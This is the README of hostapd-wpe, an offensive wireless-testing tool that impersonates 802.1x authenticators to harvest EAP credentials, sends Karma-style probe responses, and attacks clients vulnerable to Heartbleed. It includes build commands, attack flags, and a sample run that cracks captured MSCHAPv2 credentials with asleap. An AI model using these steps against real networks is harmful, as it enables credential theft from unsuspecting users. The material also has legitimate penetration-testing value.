The current hostapd-wpe.patch is for: hostapd-2.2.tar.gz

About
----------

hostapd-wpe is the replacement for FreeRADIUS-WPE 
(http://www.willhackforsushi.com/?page_id=37).

It implements IEEE 802.1x Authenticator and Authentication
Server impersonation attacks to obtain client credentials,
establish connectivity to the client, and launch other attacks
where applicable. 

hostapd-wpe supports the following EAP types for impersonation:
    1. EAP-FAST/MSCHAPv2 (Phase 0)
    2. PEAP/MSCHAPv2*
    3. EAP-TTLS/MSCHAPv2
    4. EAP-TTLS/MSCHAP
    5. EAP-TTLS/CHAP
    6. EAP-TTLS/PAP

* Does not support Microsoft's "Computer Based Authentication"

Once impersonation is underway, hostapd-wpe will return an
EAP-Success message so that the client believes they are connected
to their legitimate authenticator. 

For 802.11 clients, hostapd-wpe also implements Karma-style gratuitous 
probe responses. Inspiration for this was provided by JoMo-Kun's 
patch for older versions of hostapd.

hostapd-wpe also implements CVE-2014-0160 (Heartbleed) attacks against
vulnerable clients. Inspiration for this was provided by the Cupid PoC:

        https://github.com/lgrangeia/cupid

hostapd-wpe logs all data to stdout and hostapd-wpe.log

Quick Usage
--------
Once hostapd-wpe.patch is applied, hostapd-wpe.conf will be created
at /path/to/build/hostapd/hostapd-wpe.conf. See that file for more 
information. Note that /path/to/build/hostapd/hostapd-wpe.eap_users 
will also be created, and hostapd-wpe is dependent on it. 

Basic usage is:

    hostapd-wpe hostapd-wpe.conf 

Credentials will be displayed on the screen and stored in hostapd-wpe.log

Additional WPE command line options are:

    -s  Return EAP-Success messages after credentials are harvested
    -k  Gratuitous probe responses (Karma mode) 
    -c  Attempt to exploit CVE-2014-0160 (Cupid mode)

Building 
---------

    git clone https://github.com/OpenSecurityResearch/hostapd-wpe 

    Ubuntu/Debian/Kali Building - 
    -----------------------------------------------------------------------
        apt-get update
        apt-get install libssl-dev libnl-dev
        

    General - 
    ------------------------------------------------------------------------
    	Now apply the hostapd-wpe.patch:
        
        git clone https://github.com/OpenSecurityResearch/hostapd-wpe

        wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz
        tar -zxf hostapd-2.2.tar.gz
        cd hostapd-2.2
        patch -p1 < ../hostapd-wpe/hostapd-wpe.patch 
        cd hostapd
        make

        I copied the certs directory and scripts from FreeRADIUS to ease that 
        portion of things. You should just be able to:

        cd ../hostapd-wpe/certs
        ./bootstrap

        then finally just:
        
        cd ../hostapd-2.2/hostapd
        sudo ./hostapd-wpe hostapd-wpe.conf


Running:
----------------

    With all of that complete, you can run hostapd. The patch will
    create a new hostapd-wpe.conf, which you'll likely need to modify
    in order to make it work for your attack. Once ready just run

    hostapd hostapd-wpe.conf

    Look in the output for the username/challenge/response. I'll add
    file logging soon. You can also use -K to get additional information
    for other types! 

    for instance here are the EAP-FAST Phase 0 creds from stdout:

    username: jdslfkjs
    challenge: bc:87:6c:48:37:d3:92:6e
    response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0

    and as always, we feed them into asleap to crack:

    # asleap -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist 
    asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
    hash bytes:        b1ca
    NT hash:           e614b958df9df49ec094b8730f0bb1ca
    password:          bradtest

    Alternatively MSCHAPv2 credentials are outputted in john the rippers NETNTLM format.
